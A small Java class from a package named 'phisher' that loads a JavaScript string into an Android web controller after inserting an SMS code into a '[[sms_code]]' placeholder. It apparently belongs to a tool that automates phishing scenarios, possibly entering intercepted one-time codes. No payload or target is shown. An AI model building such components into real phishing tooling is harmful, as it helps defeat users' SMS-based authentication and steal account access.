package pl.jasiun.phisher.scenario;

import pl.jasiun.phisher.AndroidController;

public class JavascriptAction extends Action {

	private final String javascript;
	private final AndroidController controller;

	public JavascriptAction(AndroidController controller, String javascript) {
		this.controller = controller;
		this.javascript = javascript;
	}

	@Override
	public void play() {
		controller.loadUrl(javascript.replace("[[sms_code]]", getSmsCode()));
	}
}
